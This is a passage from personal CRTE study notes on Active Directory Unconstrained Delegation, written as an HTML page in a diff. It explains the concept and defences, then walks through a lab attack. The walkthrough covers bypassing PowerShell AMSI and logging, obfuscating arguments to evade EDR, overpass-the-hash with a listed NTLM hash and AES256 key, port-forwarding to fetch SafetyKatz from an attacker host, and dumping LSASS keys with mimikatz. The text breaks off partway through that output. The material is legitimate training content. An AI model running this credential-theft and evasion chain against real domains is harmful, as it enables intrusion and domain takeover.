@@ -1,0 +1,362 @@
+---
+title: Privilege Escalation - Unconstrained Delegation
+layout: docs
+---
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Privilege Escalation - Unconstrained Delegation - CRTE</title>
+  <link rel="shortcut icon" href="../../../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../../../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .crtp-sidebar { padding: 20px; }
+    .crtp-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .crtp-sidebar .portfolio-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .crtp-sidebar .portfolio-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .crtp-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .crtp-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .crtp-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1, .notion-content h2, .notion-content h3 { color: #fafafa; margin: 20px 0 10px; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTE Study Notes</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="crtp-sidebar">
+          <a href="../../" class="portfolio-link">← Portfolio</a>
+          <h3>Sections</h3>
+          <a href="overview.html" class="">Overview</a>
+
+          <a href="part-01-introduction.html" class="">Introduction</a>
+          <a href="part-02-enumeration.html" class="">Enumeration</a>
+          <a href="part-03-enumerating-gpos-ous.html" class="">Enumerating GPOs and OUs</a>
+          <a href="part-04-enumerating-acl.html" class="">Enumerating ACL (Access Control List)</a>
+          <a href="part-05-enumerating-domain-forest-trusts.html" class="">Enumerating Domain, Forest & Trusts </a>
+          <a href="part-06-privilege-escalation.html" class="">Privilege Escalation</a>
+          <a href="part-07-kerberoasting-attack.html" class="">Kerberoasting attack</a>
+          <a href="part-08-targeted-kerberoasting.html" class="">Privilege Escalation - Targeted Kerberoasting</a>
+          <a href="part-09-laps-attack.html" class="">Privilege Escalation - LAPS (Local Administrator Password Solution) Attack</a>
+          <a href="part-10-dumping-lsass-credentials.html" class="">Dumping LSASS Credentials</a>
+          <a href="part-11-gmsa-attack.html" class="">Privilege Escalation - gMSA Attack</a>
+          <a href="part-12-lsass-mde-bypass.html" class="">LSASS Attack With MDE Bypass</a>
+          <a href="part-13-pass-the-certificates.html" class="">Pass The Certificates Attack</a>
+          <a href="part-14-unconstrained-delegation.html" class="active">Privilege Escalation - Unconstrained Delegation</a>
+          <a href="part-15-constrained-delegation.html" class="">Privilege Escalation - Constrained Delegation</a>
+          <a href="part-16-rbcd.html" class="">Privilege Escalation - RBCD(Resource Based Constrained Delegation)</a>
+          <a href="part-17-golden-ticket.html" class="">Domain Persistence - Golden Ticket attack</a>
+          <a href="part-18-silver-ticket.html" class="">Domain Persistence - Silver Ticket Attack</a>
+          <a href="part-19-diamond-ticket.html" class="">Domain Persistence - Diamond Ticket Attack</a>
+          <a href="part-20-skeleton-key.html" class="">Domain Persistence - Skeleton Key Attack</a>
+          <a href="part-21-sapphire-ticket.html" class="">Domain Persistence - Sapphire Ticket Attack</a>
+          <a href="part-22-adminsdholder.html" class="">Domain Persistence - AdminSDHolder attack</a>
+          <a href="part-23-adcs-attacks.html" class="">Cross Domain Attacks - Active Directory Certificate Services Attacks</a>
+          <a href="part-24-shadow-credentials.html" class="">Shadow Credentials - Abusing User Object</a>
+          <a href="part-25-cross-domain-unconstrained.html" class="">Cross Domain Attacks - Unconstrained Delegation to Enterprise Admin</a>
+          <a href="part-26-azure-ad-phs.html" class="">Cross Domain Attacks - Attacking Azure AD Integration PHS</a>
+          <a href="part-27-child-to-forest-trust-key.html" class="">Cross Domain attacks - Child To Forest Root - SID-History Trust Key Abuse</a>
+          <a href="part-28-child-to-forest-sidhistory-krbtgt.html" class="">Cross Domain attacks - Child To Forest Root - SID-History KRBTGT Hash Abuse</a>
+          <a href="part-29-cross-forest-kerberoast.html" class="">Cross Forest Attacks - Kerberoast Attack</a>
+          <a href="part-30-protocol-transition.html" class="">Cross Forest Attacks - Constrained Delegation with Protocol Transition</a>
+          <a href="part-31-cross-forest-unconstrained.html" class="">Cross Forest Attacks - Unconstrained Delegation</a>
+          <a href="part-32-trust-key-shared-resources.html" class="">Cross Forest Attacks - Trust Key Abuse to Access Explicitly Shared Resources</a>
+          <a href="part-33-injecting-sidhistory.html" class="">Cross Forest Attacks - Injecting SID History to Bypass SID Filtering</a>
+          <a href="part-34-mssql-database-links.html" class="">Trust Abuse - MSSQL Servers - Database Links</a>
+          <a href="part-35-foreign-security-principals.html" class="">Cross Forest Attacks - Foreign Security Principals & ACLs</a>
+          <a href="part-36-pam-shadow-security-principals.html" class="">Cross Forest Attacks - Abusing PAM(Privileged Management Principals) Trust - Shadow Security Principals</a>
+          <a href="part-37-trusting-to-trusted.html" class="">Cross Forest Attacks - Trusting to Trusted - Trust Key</a>
+          <a href="part-38-abusing-trust-transitivity.html" class="">Cross Forest Attacks - Abusing Trust Transitivity</a>
+        </div>
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-back-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Back</p>
+              <a href="../../../" class="contact-link">Portfolio</a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Privilege Escalation - Unconstrained Delegation</header>
+        <section class="about-text notion-content">
+<p id="30c79e9a-d7c9-8027-8522-c52e8ea30d71" class="">Unconstrained Delegation is a critical topic in Active Directory (AD) security, particularly because it represents a significant attack vector for adversaries when misconfigured. To master this topic, you need to understand how it works, why it exists, the security implications, and both offensive and defensive strategies around it. Here&#x27;s everything you need to know, explained clearly and in-depth.</p><p id="30c79e9a-d7c9-8047-8bab-c6374d3100b8" class="">Unconstrained Delegation is an AD feature that allows a computer or service to impersonate any user that authenticates to it. This feature relies on Kerberos authentication, a protocol used extensively in Windows environments. When a user or service authenticates to a system with Unconstrained Delegation enabled, their Ticket Granting Ticket (TGT) is stored in the memory of the system they connect to. The system can then use this TGT to act on behalf of the user and access other services in the network. For example, if a user authenticates to a file server with Unconstrained Delegation enabled, the server can use the user’s TGT to impersonate the user and access other network resources.</p><p id="30c79e9a-d7c9-802d-be1e-e33caaf34552" class="">Unconstrained Delegation was originally introduced to simplify service impersonation, particularly for applications that need to interact with multiple resources on behalf of a user. For example, a web application might need to query a database and access file shares using the same user credentials. By caching the TGT, the application could impersonate the user without requiring additional authentication. However, this feature creates a massive security risk because any compromise of a system with Unconstrained Delegation enabled exposes the TGTs of all users who authenticate to it. This makes Unconstrained Delegation systems prime targets for attackers.</p><p id="30c79e9a-d7c9-80b7-babe-e0c8a0b8cae9" class="">As we can see on the diagram below, the Web Server has <code><strong>TrustedForDelegation</strong></code> flag enabled, meaning that it has Unconstrained Delegation configured and the Web Server can impersonate any user that logged in to this server to any service in the domain on behalf of these previously logged in users.</p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/webfsuser.png" alt="Image"/><p id="30c79e9a-d7c9-8033-b3d2-d3159098e371" class="">We can also spot that target has been configure with Unconstrained Delegation if we find the server settings configured with <code><strong>Trust this computer for delegation to any service (Kerberos Only)</strong></code>.</p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/webfsuser(1).png" alt="Image"/><p id="30c79e9a-d7c9-807d-ade1-ee7c66a59455" class="">The biggest security issue with Unconstrained Delegation is that it enables an attacker to escalate privileges and move laterally within the network. When a system configured with this feature is compromised, the attacker can extract cached TGTs from memory using tools like mimikatz. These TGTs allow the attacker to impersonate users, including privileged accounts like domain administrators, effectively giving them access to sensitive resources and enabling further exploitation of the domain. The danger is amplified by the fact that many organizations unknowingly leave critical systems, such as domain controllers, configured with Unconstrained Delegation, which is enabled by default for certain configurations.</p><p id="30c79e9a-d7c9-806b-b2bd-f65abb7fc032" class="">An important step in mastering this topic is understanding the role of service accounts and machine accounts. In AD, delegation can be applied to both service accounts (used by applications) and computer accounts (representing systems in the domain). When a service or machine account is configured with Unconstrained Delegation, it effectively acts as a catch-all for user TGTs. If a privileged account, such as a domain administrator, interacts with such a system, their TGT will be cached in memory, making it available to an attacker who compromises that system.</p><p id="30c79e9a-d7c9-80d6-924f-fcba0831fb9b" class="">You should also understand how attackers identify and exploit systems with Unconstrained Delegation. </p><p id="30c79e9a-d7c9-8099-8132-df8bb38d283d" class="">Attackers typically use tools like BloodHound, AdModule or PowerView modules  to enumerate AD environments and identify systems configured with Unconstrained Delegation. Once identified, these systems become high-value targets because compromising them often leads to significant privilege escalation opportunities. Attackers can perform Pass-the-Ticket attacks by extracting TGTs from memory and using them to authenticate to other systems. This attack method is stealthy because it bypasses traditional password or NTLM-based authentication mechanisms.</p><p id="30c79e9a-d7c9-8051-8bec-d0f1a1bf21d5" class="">Detecting systems with Unconstrained Delegation involves querying AD for accounts with the <code>TrustedForDelegation</code> attribute enabled. This attribute is a flag that indicates whether a computer or service account is configured for Unconstrained Delegation. Administrators can use PowerShell, LDAP queries, or third-party tools like BloodHound or PowerShell modules like, ADModule and PowerView to identify these accounts. Once detected, it is important to evaluate whether delegation is genuinely required and, if not, reconfigure or disable it.</p><p id="30c79e9a-d7c9-803d-8f1b-f9a7fb60f2cb" class="">Defending against Unconstrained Delegation requires a combination of proper configuration, monitoring, and policy enforcement. The best approach is to transition systems to use Constrained Delegation or Resource-Based Constrained Delegation (RBCD), which limit delegation to specific resources or services. High-privilege accounts, such as domain administrators, should be configured with &quot;Account is sensitive and cannot be delegated,&quot; which prevents their TGTs from being cached on delegation-enabled systems. Additionally, systems configured with delegation should be monitored for unusual activity, such as unexpected service ticket requests or TGT extraction attempts.</p><p id="30c79e9a-d7c9-80f4-af21-de740b6ce2c3" class="">Understanding Unconstrained Delegation also requires knowledge of its relationship to domain controllers. Domain controllers are particularly critical because they are configured with Unconstrained Delegation by default. This is necessary for their role in the Kerberos authentication process, as they must impersonate users to issue service tickets. However, this default configuration means that any compromise of a domain controller effectively grants an attacker full access to the domain.</p><p id="30c79e9a-d7c9-80b5-9915-c33794f04b35" class="">In conclusion, Unconstrained Delegation is a powerful but risky feature in AD environments. It simplifies authentication for legitimate use cases but creates significant security vulnerabilities if not properly managed. To master this topic, you need to understand how it works, its security implications, and how attackers exploit it. You also need to focus on detection and mitigation techniques to minimize the risks associated with this feature. By combining theoretical knowledge with practical experience, you can effectively secure AD environments against Unconstrained Delegation-based attacks. </p><h1 id="30c79e9a-d7c9-80f0-9353-d65411033268" class="">Enumerating Unconstrained Delegation with ADModule</h1><p id="30c79e9a-d7c9-80f6-8c89-d01f675bf9b6" class="">Let’s start our Unconstrained Delegation with ADModule by executing InvisiShell to bypass PowerShell security features like system-wide transcription, Script Block Logging, AMSI and Constrained Language Mode(CLM).</p><p id="30c79e9a-d7c9-80ae-9810-ceb1d328d18e" class=""><code>RunWithRegistryNonAdmin.bat</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20126.png" alt="Image"/><p id="30c79e9a-d7c9-80a6-8384-f815e55d26cb" class="">After bypassing Powershell Security Features we can now import ADModule.</p><p id="30c79e9a-d7c9-8018-8c43-c188fe77d218" class=""><code>Import-Module Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll</code></p><p id="30c79e9a-d7c9-8025-af54-c79ee3385cba" class=""><code>Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20127.png" alt="Image"/><p id="30c79e9a-d7c9-804f-a56d-ff2e0352b7b0" class="">We can now start enumerating Unconstrained Delegation. The command we will use, will enumerate if there’s any computer in our target domain with <strong>Unconstrained Delegation </strong>enabled.</p><p id="30c79e9a-d7c9-8043-9fc8-f7c532e4c2f2" class=""><code>Get-ADComputer -Filter {TrustedForDelegation -eq $True}</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20128.png" alt="Image"/><ul><li><strong>DistinguishedName</strong>:<ul><li>This is the LDAP path to the computer object in Active Directory. It includes the organizational unit (OU) or container where the object resides, as well as the domain name. For example, <code>CN=US-DC,OU=Domain Controllers,DC=us,DC=techcorp,DC=local</code> indicates that the <code>US-DC</code> computer is in the &quot;Domain Controllers&quot; OU within the <code>us.techcorp.local</code> domain.</li></ul></li></ul><ul><li><strong>DNSHostName</strong>:<ul><li>This is the fully qualified domain name (FQDN) of the computer in the AD domain. For example, <code>US-DC.us.techcorp.local</code> represents the FQDN for the <code>US-DC</code> computer.</li></ul></li></ul><ul><li><strong>Enabled</strong>:<ul><li>This indicates whether the computer account is active (True) or disabled (False). Both computers in your output are active since <code>Enabled</code> is set to <code>True</code>.</li></ul></li></ul><ul><li><strong>Name</strong>:<ul><li>This is the NetBIOS name of the computer, such as <code>US-DC</code> or <code>US-WEB</code>. It&#x27;s the shorter, non-FQDN identifier used within the domain.</li></ul></li></ul><ul><li><strong>ObjectClass</strong>:<ul><li>This indicates the type of object in Active Directory. In this case, the value is <code>computer</code>, meaning the objects being queried are computer accounts.</li></ul></li></ul><ul><li><strong>ObjectGUID</strong>:<ul><li>This is the globally unique identifier (GUID) of the computer object in Active Directory. Every AD object has a unique GUID to distinguish it, regardless of its name or location.</li></ul></li></ul><ul><li><strong>SamAccountName</strong>:<ul><li>This is the Security Account Manager (SAM) name of the computer object. By convention, it is the NetBIOS name of the computer followed by a <code>$</code> sign, such as <code>US-DC$</code> or <code>US-WEB$</code>. The <code>$</code> sign indicates that it&#x27;s a computer account, not a user account.</li></ul></li></ul><ul><li><strong>SID (Security Identifier)</strong>:<ul><li>This is the unique security identifier assigned to the computer object in the domain. It is used to identify the object in access control lists (ACLs) and other security contexts.</li></ul></li></ul><ul><li><strong>UserPrincipalName</strong>:<ul><li>This field is typically used for user accounts and contains the user’s logon name in email format (e.g., <code>user@domain.com</code>). For computer accounts, this field is often empty, as seen in your output.</li></ul></li></ul><p id="30c79e9a-d7c9-8054-9c3f-dc53a0f210e2" class="">We can see above that we do have do have 2 computers in our target domain that have the flag <code><strong>TrustedForDelegation</strong></code> enabled.<br/>In this case we have <code><strong>US-DC</strong></code> and <code><strong>US-WEB</strong></code> with <strong>Unconstrained Delegation</strong> configured. Since we were able to compromise the <code><strong>US-WEB</strong></code> host on the previous lab, we can explore <strong>Unconstrained Delegation</strong> on <code><strong>US-WEB</strong></code> host. </p><p id="30c79e9a-d7c9-8035-9643-f5d0be5e11e5" class="">We can start by elevating our privilege as US-WEB using OverPass-The-Hash attack using webmaster’s AES256 with SafetyKatz.</p><p id="30c79e9a-d7c9-807a-b5d3-dbd51f127e85" class="">User: <strong>webmaster</strong></p><p id="30c79e9a-d7c9-8050-a011-e17aaec4edd3" class="">NTLM_Hash: <strong>1d49d390ac01d568f0ee9be82bb74d4c</strong></p><p id="30c79e9a-d7c9-80c9-a1ce-e4db4cb7c7e2" class="">AES256: <strong>2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0</strong></p><p id="30c79e9a-d7c9-80a5-8284-fb242c23b26b" class="">Let’s start by  encoding our Rubeus argument(<code><strong>asktgt</strong></code>) using ArgSplit.bat</p><p id="30c79e9a-d7c9-80fa-9dda-ef3d8e18589c" class=""><code>ArgSplit.bat</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20129.png" alt="Image"/><p id="30c79e9a-d7c9-809f-8b52-df1f33b85729" class="">After doing a Copy/Paste of the encoded argument we can run our Rubeus.exe in the memory using Loader.exe.</p><p id="30c79e9a-d7c9-80ba-8fb7-e2e8f7791e07" class=""><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args &quot;%Pwn%&quot; /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></p><p id="30c79e9a-d7c9-80a1-ad03-f934bf993071" class="">We can see that our ticket has been successfully imported. Now that we do have elevated our as webmaster let’s use Find-PSRemotingLocalAdminAccess to find out if our user has Local Admin access on any machine inside our target domain.</p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20130.png" alt="Image"/><p id="30c79e9a-d7c9-800c-9980-c01186d3c82a" class="">We can see above that webmaster has local admin access inside US-WEB host.</p><p id="30c79e9a-d7c9-8008-9585-f8ed78e9d5eb" class="">I also tried to make the same enumeration using <code><strong>Find-LocalAdminAccess</strong></code> from PowerView module but I was not able to find the same result. <code><strong>Find-LocalAdminAccess</strong></code> did not bring US-Web as a valid host that webmaster has local Admin Access.</p><p id="30c79e9a-d7c9-80fa-a7e3-d08a7b489877" class=""><code>Import-Module .\PowerView.ps1</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20131.png" alt="Image"/><h3 id="30c79e9a-d7c9-8062-8da9-f001888ed399" class=""><strong>Key Differences</strong></h3><ol><li><code><strong>Find-PSRemotingLocalAdminAccess</strong></code>:<ul><li>It specifically checks for local administrator access <strong>via PowerShell Remoting (WinRM)</strong>.</li></ul><ul><li>It requires WinRM to be enabled and properly configured on the target machines.</li></ul><ul><li>If WinRM is blocked by a firewall or not enabled, the tool may not give accurate results or fail to connect.</li></ul></li></ol><ol><li><code><strong>Find-LocalAdminAccess</strong></code><strong> (PowerView)</strong>:<ul><li>It checks local administrator access <strong>based on LDAP enumeration</strong>.</li></ul><ul><li>This method does not rely on WinRM but instead queries group membership via domain enumeration.</li></ul><ul><li>If WinRM isn&#x27;t working but LDAP data is accessible, this method may yield results that differ from <code>Find-PSRemotingLocalAdminAccess</code>.</li></ul></li></ol><p id="30c79e9a-d7c9-80a1-bf49-d274266d3b86" class=""><strong>Let’s move on…</strong></p><h2 id="30c79e9a-d7c9-800f-b0ae-d4f4c6481e07" class="">PortForwarding to bypass EDR</h2><p id="30c79e9a-d7c9-80df-91bc-c8517b359d3f" class="">To avoid being caught by any defensive mechanism, we can  simply create a PortForwarding on the target machine then call SafetyKatz using it’s <a href="http://localhost">localhost</a> IP.</p><p id="30c79e9a-d7c9-80fc-aac9-fb1dbbd3d55c" class=""><code>winrs -r:US-WEB cmd</code></p><p id="30c79e9a-d7c9-8001-9147-fc0e7d9c9702" class=""><code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=192.168.100.163</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20132.png" alt="Image"/><h3 id="30c79e9a-d7c9-801e-acb9-c6fa7f384c18" class=""><strong>1. </strong><code><strong>netsh interface portproxy add v4tov4</strong></code><strong>:</strong></h3><ul><li><code><strong>netsh interface portproxy</strong></code><strong>:</strong> This is the part of the <code>netsh</code> utility that deals with port forwarding. It allows forwarding TCP traffic from one IP/port combination to another.</li></ul><ul><li><code><strong>add</strong></code><strong>:</strong> Specifies that you&#x27;re adding a new forwarding rule.</li></ul><ul><li><code><strong>v4tov4</strong></code><strong>:</strong> Indicates that both the listening and connecting addresses use IPv4.</li></ul><h3 id="30c79e9a-d7c9-8035-a24f-d50d1fc38ac0" class=""><strong>2. </strong><code><strong>listenport=8080</strong></code><strong>:</strong></h3><ul><li>The port on the <strong>local machine (target machine)</strong> where the service will &quot;listen&quot; for incoming connections.</li></ul><ul><li>In this case, the machine will listen on port <code>8080</code>.</li></ul><h3 id="30c79e9a-d7c9-8066-8cd7-d7f72c2f7c53" class=""><strong>3. </strong><code><strong>listenaddress=0.0.0.0</strong></code><strong>:</strong></h3><ul><li>The IP address on the <strong>local machine</strong> where the service will listen for connections.</li></ul><ul><li><code>0.0.0.0</code> means it will listen on all network interfaces available on the machine (e.g., public, private, or loopback IPs).</li></ul><h3 id="30c79e9a-d7c9-80d1-982c-cdcd91d219c8" class=""><strong>4. </strong><code><strong>connectport=80</strong></code><strong>:</strong></h3><ul><li>The port on the <strong>remote machine (Out Attacking Machine)</strong> to which traffic will be forwarded.</li></ul><ul><li>In this case, port <code>80</code> (commonly used for HTTP).</li></ul><h3 id="30c79e9a-d7c9-80d9-aeeb-fac3922a266a" class=""><strong>5. </strong><code><strong>connectaddress=192.168.100.163</strong></code><strong>:</strong></h3><ul><li>The IP address of the <strong>remote machine (Our Attacking Machine)</strong>.</li></ul><p id="30c79e9a-d7c9-80ba-8b1c-fa111da6ad1c" class="">This port forwarding setup redirects traffic received on port 8080 from our compromised machine to port 80 on our attacking macchine (192.168.100.163),  which acts as a bridge. <br/>We can check this portforwarding with the following command:</p><p id="30c79e9a-d7c9-8086-a181-c42e197c0477" class=""><code>nesh interface portproxy show all</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20133.png" alt="Image"/><h1 id="30c79e9a-d7c9-80f0-a837-dbfae6d4845e" class="">1st Use Case Scenario</h1><p id="30c79e9a-d7c9-8007-ac16-e22295d63b08" class="">For the first part of this demonstration, I want to prove that simply having a machine configured with Unconstrained Delegation does not immediately give me access to high-privileged accounts unless those accounts have previously authenticated to the machine. Unconstrained Delegation allows a system to impersonate any account that logs into it by caching Kerberos Ticket Granting Tickets (TGTs) in memory. However, if a Domain Admin or the domain controller (DC$) has never interacted with this machine, their credentials will not be present in memory for me to extract.</p><p id="30c79e9a-d7c9-80a0-b5bc-d7b9d5fd170f" class="">To begin, I will attempt to dump the LSASS process memory on my target machine, US-WEB, which has Unconstrained Delegation enabled. Since no privileged accounts have logged into this machine yet, I expect that my credential dump will only contain standard users or service accounts that have previously authenticated to US-WEB. This will confirm that Unconstrained Delegation alone does not provide direct access to a Domain Admin or DC$ credentials unless they have actively connected to the machine.</p><p id="30c79e9a-d7c9-8004-a2f3-e13415bcb107" class="">Once I extract the credentials, I will analyze them carefully. If my assumption is correct, I will not find any Domain Admin accounts or the domain controller&#x27;s machine account (DC$) in the results. This demonstrates a crucial limitation of Unconstrained Delegation: I need a high-privileged account to interact with the delegated machine before I can leverage their credentials for privilege escalation. Simply having a machine configured for delegation does not automatically expose valuable tickets; I must wait for—or force—a privileged account to authenticate to the system.</p><p id="30c79e9a-d7c9-808f-894b-f565eb835de9" class="">This sets up the need for the second part of the demonstration, where I will actively coerce the domain controller (DC$) to authenticate to US-WEB. By using a known technique, the Print Spooler Bug (PrintNightmare), I can force the DC$ account to establish a connection with the machine, allowing me to capture its Kerberos ticket in memory. Once this is done, I will perform another LSASS memory dump, and this time, I expect to find the DC$ ticket available for extraction. This will allow me to impersonate the domain controller and move toward full domain compromise.</p><p id="30c79e9a-d7c9-800f-993d-c5f8058f147f" class="">For this step of the demonstration, I start by mapping a network drive (<code>X:</code>) to the target machine, US-WEB, specifically pointing to the <code>Downloads</code> directory of the <code>webmaster</code> user. <br/>This allows me to interact with the target machine’s file system remotely as if it were a local drive. Once the mapping was successful, I used <code>XCOPY</code> to transfer <code>Loader.exe</code> from my attacking machine to the target. </p><p id="30c79e9a-d7c9-8013-add0-e540c9e39967" class=""><code>net use x: \\US-WEB\C$\Users\webmaster\Downloads</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20134.png" alt="Image"/><p id="30c79e9a-d7c9-8010-8953-de72b9dc6905" class="">The purpose of <code>Loader.exe</code> is to execute <code>SafetyKatz.exe</code> directly in memory, allowing me to extract credentials from LSASS without writing <code>SafetyKatz.exe</code> to disk. This setup ensures that I have the necessary tooling on the target machine while minimizing detection by security solutions.</p><p id="30c79e9a-d7c9-80a7-af82-dff0bcb1d4a1" class=""><code>echo F  | XCOPY  C:\AD\Tools\Loader.exe x:Loader.exe</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20135.png" alt="Image"/><p id="30c79e9a-d7c9-8008-b3b4-fa5946efc66f" class="">For this next step, I need to encode the argument that will be passed to <strong>SafetyKatz.exe</strong>, specifically the <strong>sekurlsa::ekeys</strong> command, which I will use to extract Kerberos encryption keys from memory. Instead of passing the argument in plaintext, I am using <strong>ArgSplit.bat</strong> to obfuscate it. </p><p id="30c79e9a-d7c9-8022-82f9-e7d5d25640c4" class="">ArgSplit.bat works by breaking down and encoding the command using environment variable substitutions in Windows batch scripting. Each letter of the argument is assigned a variable, which is later reconstructed when the batch script executes. This technique helps evade detection by security solutions such as Microsoft Defender for Endpoint (MDE) and other Endpoint Detection and Response (EDR) tools, which often flag direct execution of known malicious commands.</p><p id="30c79e9a-d7c9-80f0-8639-f112fff55799" class="">By encoding the <strong>sekurlsa::ekeys</strong> command, I ensure that when I later execute SafetyKatz in-memory using Loader.exe, the argument won’t be immediately recognizable as suspicious, reducing the chances of triggering security alerts. This step is crucial in maintaining stealth during the attack while ensuring that I can extract the necessary credentials from LSASS.</p><p id="30c79e9a-d7c9-80e1-9a2a-ddd0773af5ff" class=""><code>ArgSplit.bat</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20136.png" alt="Image"/><p id="30c79e9a-d7c9-80e8-ae24-f643ff13fa89" class="">We do a Copy/paste into our target session.</p><p id="30c79e9a-d7c9-807f-b13e-faf4979af436" class="">Now that everything is set up, I can proceed with dumping the Kerberos encryption keys from memory. I execute <strong>Loader.exe</strong> and provide it with the path to <strong>SafetyKatz.exe</strong>, which is hosted on my local HTTP server. Instead of passing the <strong>sekurlsa::ekeys</strong> argument in plaintext, I use the encoded version stored in <code>%Pwn%</code>, which was generated earlier using <strong>ArgSplit.bat</strong>. This helps evade detection by security solutions.</p><p id="30c79e9a-d7c9-80f3-a65a-d7c303c13ccc" class="">When <strong>Loader.exe</strong> executes, it downloads <strong>SafetyKatz.exe</strong> directly into memory, preventing it from ever touching disk. This in-memory execution minimizes the risk of triggering antivirus or EDR alerts. Once loaded, SafetyKatz runs the <strong>sekurlsa::ekeys</strong> command to extract Kerberos encryption keys from the LSASS process. These keys are critical because they allow me to perform <strong>Pass-the-Ticket (PTT)</strong> attacks or impersonate authenticated users without needing their passwords.</p><p id="30c79e9a-d7c9-80b7-a7d1-f241d5b96865" class="">After the execution, the <code>&quot;exit&quot;</code> argument ensures the process terminates cleanly, further reducing any forensic evidence left behind. At this stage, I should be able to see the extracted encryption keys, but as expected, I won’t find any from a <strong>Domain Admin</strong> or the <strong>DC$</strong> account since they have not logged into the target machine yet. This confirms my earlier assumption that Unconstrained Delegation only works if a high-privilege user has authenticated to the compromised machine.</p><p id="30c79e9a-d7c9-801f-a76d-d59b1df2a013" class="">This sets up the next phase of my attack, where I will force the domain controller to authenticate to my target machine. Once the <strong>US-DC$</strong> account has interacted with US-WEB, I will repeat this process, and this time, I should be able to extract its encryption keys from memory.</p><p id="30c79e9a-d7c9-804a-bedd-faa48623dfe4" class=""><code>C:\Users\webmaster\Downloads\Loader.exe -Path </code><code><a href="http://127.0.0.1:8080/SafetyKatz.exe">http://127.0.0.1:8080/SafetyKatz.exe</a></code><code> -args &quot;%Pwn%&quot; &quot;exit&quot;</code></p><ul id="30c79e9a-d7c9-80eb-9869-ed2255c050ab" class="toggle"><li><details open=""><summary><strong>ekeys</strong></summary><pre id="30c79e9a-d7c9-80f0-85f0-d09e5b04792b" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">mimikatz(commandline) # sekurlsa::ekeys
+
+Authentication Id : 0 ; 17217244 (00000000:0106b6dc)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/7/2024 2:44:47 AM
+SID               : S-1-5-90-0-2
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
